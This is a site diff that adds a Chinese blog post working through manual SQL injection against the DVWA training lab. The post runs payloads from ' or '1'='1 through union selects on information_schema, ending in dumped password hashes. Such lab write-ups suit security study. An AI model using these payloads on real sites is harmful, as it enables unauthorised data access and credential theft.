@@ -83,7 +83,7 @@
 <link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Jekyll, NexT" />
+  <meta name="keywords" content="sql," />
 
 
 
@@ -111,17 +111,17 @@
 
 
 
-<meta name="description" content="个人笔记">
-<meta name="keywords" content="Jekyll, NexT">
-<meta property="og:type" content="website">
-<meta property="og:title" content="悠悠然">
-<meta property="og:url" content="http://localhost:4000/tags/">
+<meta name="description" content="sql注入简单练习。">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基础SQL注入">
+<meta property="og:url" content="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/">
 <meta property="og:site_name" content="悠悠然">
-<meta property="og:description" content="个人笔记">
+<meta property="og:description" content="sql注入简单练习。">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="悠悠然">
-<meta name="twitter:description" content="个人笔记">
+<meta name="twitter:title" content="基础SQL注入">
+<meta name="twitter:description" content="sql注入简单练习。">
 
 
 <script type="text/javascript" id="hexo.configurations">
@@ -154,7 +154,7 @@
 
 
 
-  <title>              标签 | 悠悠然      </title>
+  <title>基础SQL注入 | 悠悠然</title>
   
 
 
@@ -314,42 +314,368 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
+
 <div id="posts" class="posts-expand">
-<header class="post-header">
+  
+  
 
-	<h1 class="post-title" itemprop="name headline">
-    
-      标签
-    
-  </h1>
-
-
-
-</header>
+  
 
   
   
-    <div class="tag-cloud">
-      <div class="tag-cloud-title">
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/%E5%AE%89%E5%85%A8/2018/12/20/%E5%9F%BA%E7%A1%80sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jsf">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/assets/images/logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="悠悠然">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
           
-            目前共计 3 个标签
           
-      </div>
-      <div class="tag-cloud-tags">
+            基础SQL注入
+          
+        </h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-20T00:00:00+08:00">
+                2018-12-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/%E5%AE%89%E5%85%A8" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+                <div class="post-description">
+                    sql注入简单练习。
+                </div>
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         
-        
-        
-        
-        
-        
+  
+  
 
 
 
-        <a href="/tag/#/C" style="font-size: 12.0px;color: rgb(204,204,204)">C</a> <a href="/tag/#/Dos" style="font-size: 30.0px;color: rgb(17,17,17)">Dos</a> <a href="/tag/#/sql" style="font-size: 12.0px;color: rgb(204,204,204)">sql</a>
-      </div>
+
+
+
+
+
+
+
+
+
+  <div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> 手工sql注入</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+sql注入，就是用户通过浏览器提交的变量内容，后台应用程序对浏览器提交的内容并未进行检查过滤，
+直接拼接sql语句后去查询数据库，导致将数据库中的其它信息返回至用户界面中，造成数据库中其它未对用户授权的数据泄漏。
+</p>
+</div>
+
+<div id="outline-container-sec-1-1" class="outline-3">
+<h3 id="sec-1-1"><span class="section-number-3">1.1</span> DVWA Sql注入学习</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+测试sql语句
+</p>
+<pre class="example">
+"SELECT first_name, last_name FROM users WHERE user_id = '$id';"
+</pre>
+</div>
+<div id="outline-container-sec-1-1-1" class="outline-4">
+<h4 id="sec-1-1-1"><span class="section-number-4">1.1.1</span> 返回内容正常</h4>
+<div class="outline-text-4" id="text-1-1-1">
+<pre class="example">
+ID: 1
+First name: admin
+Surname: admin
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-2" class="outline-4">
+<h4 id="sec-1-1-2"><span class="section-number-4">1.1.2</span> 返回查询所有记录</h4>
+<div class="outline-text-4" id="text-1-1-2">
+<pre class="example">
+ID: 1' or '1'='1
+First name: admin
+Surname: admin
+ID: 1' or '1'='1
+First name: Gordon
+Surname: Brown
+ID: 1' or '1'='1
+First name: Hack
+Surname: Me
+ID: 1' or '1'='1
+First name: Pablo
+Surname: Picasso
+ID: 1' or '1'='1
+First name: Bob
+Surname: Smith
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-3" class="outline-4">
+<h4 id="sec-1-1-3"><span class="section-number-4">1.1.3</span> 判断有多少个字段，修改order by 后面的字段值，直到数据库报错</h4>
+<div class="outline-text-4" id="text-1-1-3">
+<pre class="example">
+ID: 1' or 1=1 order by 2 #
+First name: admin
+Surname: admin
+ID: 1' or 1=1 order by 2 #
+First name: Gordon
+Surname: Brown
+ID: 1' or 1=1 order by 2 #
+First name: Hack
+Surname: Me
+ID: 1' or 1=1 order by 2 #
+First name: Pablo
+Surname: Picasso
+ID: 1' or 1=1 order by 2 #
+First name: Bob
+Surname: Smith
+执行结果说明，sql查询语句中只有两个字段
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-4" class="outline-4">
+<h4 id="sec-1-1-4"><span class="section-number-4">1.1.4</span> 确定显示的字段顺序</h4>
+<div class="outline-text-4" id="text-1-1-4">
+<pre class="example">
+ID: 1' union select 1,2 #
+First name: admin
+Surname: admin
+ID: 1' union select 1,2 #
+First name: 1
+Surname: 2
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-5" class="outline-4">
+<h4 id="sec-1-1-5"><span class="section-number-4">1.1.5</span> 获取当前数据库及版本</h4>
+<div class="outline-text-4" id="text-1-1-5">
+<pre class="example">
+ID: 1' union select version(),database() #
+First name: admin
+Surname: admin
+ID: 1' union select version(),database() #
+First name: 10.1.26-MariaDB-0+deb9u1
+Surname: dvwa
+从返回结果中我们可以看出数据库的名称和版本号
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-6" class="outline-4">
+<h4 id="sec-1-1-6"><span class="section-number-4">1.1.6</span> 获取数据库中的表</h4>
+<div class="outline-text-4" id="text-1-1-6">
+<pre class="example">
+ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+First name: admin
+Surname: admin
+ID: 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
+First name: 1
+Surname: guestbook,users
+返回结果说明，数据库中存在了两张表为: guestbook,user
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-7" class="outline-4">
+<h4 id="sec-1-1-7"><span class="section-number-4">1.1.7</span> 获取表字段名称</h4>
+<div class="outline-text-4" id="text-1-1-7">
+<pre class="example">
+ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #
+First name: admin
+Surname: admin
+ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #
+First name: 1
+Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-1-1-8" class="outline-4">
+<h4 id="sec-1-1-8"><span class="section-number-4">1.1.8</span> 获取表中数据</h4>
+<div class="outline-text-4" id="text-1-1-8">
+<pre class="example">
+ID: 1' union select group_concat(first_name),group_concat(password) from users #
+First name: admin
+Surname: admin
+ID: 1' union select group_concat(first_name),group_concat(password) from users #
+First name: admin,Gordon,Hack,Pablo,Bob
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99
+
+
+ID: 1' union select last_name,password from users #
+First name: admin
+Surname: admin
+ID: 1' union select last_name,password from users #
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' union select last_name,password from users #
+First name: Brown
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' union select last_name,password from users #
+First name: Me
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' union select last_name,password from users #
+First name: Picasso
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' union select last_name,password from users #
+First name: Smith
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</pre>
+
+<!-- more-forword -->
+
+
+<!-- more -->
+</div>
+</div>
+</div>
+</div>
+
+
+      
     </div>
-  
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            
+            <a href="/tag/#/sql" rel="tag"># sql</a>
+          
+        </div>
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/network/2018/12/19/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/" rel="prev" title="WireShark过滤规则">
+                WireShark过滤规则 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
 </div>
 
 
@@ -358,6 +684,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -375,10 +705,30 @@
     <div class="sidebar-inner">
 
       
+        
+        
+        
+
+
+
+
+
+
 
       
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/assets/images/logo.png"
@@ -449,6 +799,34 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-2"> <a class="nav-link" href="#sec-1"> <span class="nav-number">1</span> <span class="nav-text">1 手工sql注入</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#sec-1-1"> <span class="nav-number">1.1</span> <span class="nav-text">1.1 DVWA Sql注入学习</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-1"> <span class="nav-number">1.1.1</span> <span class="nav-text">1.1.1 返回内容正常</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-2"> <span class="nav-number">1.1.2</span> <span class="nav-text">1.1.2 返回查询所有记录</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-3"> <span class="nav-number">1.1.3</span> <span class="nav-text">1.1.3 判断有多少个字段，修改order by 后面的字段值，直到数据库报错</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-4"> <span class="nav-number">1.1.4</span> <span class="nav-text">1.1.4 确定显示的字段顺序</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-5"> <span class="nav-number">1.1.5</span> <span class="nav-text">1.1.5 获取当前数据库及版本</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-6"> <span class="nav-number">1.1.6</span> <span class="nav-text">1.1.6 获取数据库中的表</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-7"> <span class="nav-number">1.1.7</span> <span class="nav-text">1.1.7 获取表字段名称</span> </a> </li> <li class="nav-item nav-level-4"> <a class="nav-link" href="#sec-1-1-8"> <span class="nav-number">1.1.8</span> <span class="nav-text">1.1.8 获取表中数据</span> </a> </li> </ol> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
